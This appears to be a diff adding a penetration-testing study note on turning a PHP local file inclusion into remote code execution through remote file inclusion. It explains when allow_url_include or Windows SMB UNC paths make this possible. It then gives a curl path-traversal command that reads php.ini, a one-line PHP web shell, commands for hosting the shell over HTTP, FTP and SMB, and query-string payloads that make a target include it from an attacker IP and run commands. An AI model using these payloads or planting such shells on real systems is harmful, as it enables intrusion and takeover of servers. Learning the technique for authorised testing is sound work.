@@ -1,0 +1,127 @@
+---
+Primary_category: "[[LFI]]"
+title: "LFI TO RCE - RFI"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[LFI]]
+
+#### *Theory*
+
+The main reason why it is difficult to see a *Remote File Inclusion* nowadays is because the *allow_url_include* *PHP* directive is disable by default
+
+It allows the use of *URLs* with the following functions
+
+```bash
+include()
+include_once()
+require()
+require_once()
+```
+
+Therefore, it is mandatory to check whether this directive is enabled or not
+
+Moreover, it is necessary that the function to which the input data is passed supports *URLs* and evaluates the content in addition to including it, like the functions above
+
+If the given function does not evaluate the content of the specified resource, we cannot carry out a *RFI*, but we can perform an *internal port discovery*, i.e. *[[SSRF]]*
+
+> [!DANGER]- *SMB*
+>
+> If the vulnerable web application is hosted on a Windows machine, we do not need that the *allow_url_include* directive is enabled in order to carry out an RFI, as we can utilize the *SMB* protocol for this purpose
+>
+> This is because Windows treats files on remote *SMB* servers as normal files, which can be referenced via its *UNC* path
+>
+
+##### *Functions*
+
+This functions would allow either *RFI* or *SSRF*
+
+| ***FUNCTION*** | ***READ CONTENT*** | ***EXECUTE*** | ***REMOTE URL*** |
+| --- | --- | --- | --- |
+| **`include()`** <br> **`include_once()`** | ✔ | ✔ | ✔ |
+| **`require()`** <br> **`require_once()`** | ✔ | ✔ | ✔ |
+| **`file_get_contents()`** | ✔ | ❌ | ✔ |
+
+---
+
+#### *Verifying RFI*
+
+As stated, first we must check whether the *allow_url_include* directive is enabled or not
+
+To do so, we can proceed as follows by leveraging the discovered *LFI*
+
+```bash
+curl --silent --location --request GET "https://www.domain.com/index.php?language=../../../etc/php/8.1/fpm/php.ini" | grep -iP --color -- '^allow_url_include=.*$'
+```
+
+We simply list the content of the current *PHP* configuration file and filter by the directive
+
+Moreover, we have to check if the vulnerable function allows *URLs* and evaluates the content of the specified resource
+
+We can verify this by requesting a *PHP* resource providing an *URL*
+
+```bash
+?language=http://127.0.0.1/index.php
+```
+
+If the content of the specified resource is listed, the given function allows *URLs*. Moreover, if the resource is not included as source code but rather executed and rendered as *PHP*, it allows *PHP* execution as well, therefore being an *RFI*
+
+---
+
+#### *Abuse*
+
+##### *Creating a Web Shell*
+
+```bash
+echo -n "<?php system($_GET[0]); ?>" > shell.php
+```
+
+##### *Setting up a Server*
+
+###### *HTTP*
+
+```bash
+python3 -m http.server 80 # or 443
+```
+
+###### *FTP*
+
+```bash
+python3 pyftpdlib -p 21
+```
+
+###### *SMB*
+
+```bash
+smbserver.py -smb2support smbFolder "$( pwd )"
+```
+
+##### *RCE*
+
+###### *HTTP*
+
+- ***Payload***
+
+```bash
+?language=http://<ATTACKER_IP>/shell.php&0=<COMMAND>
+```
+
+###### *FTP*
+
+- ***Payload***
+
+```bash
+?language=ftp://<USER>:<PASS>@<ATTACKER_IP>/shell.php&0=<COMMAND>
+```
+
+###### *SMB*
+
+- ***Payload***
+
+```bash
+?language=\\<ATTACKER_IP>\shell.php&0=<COMMAND>
+```
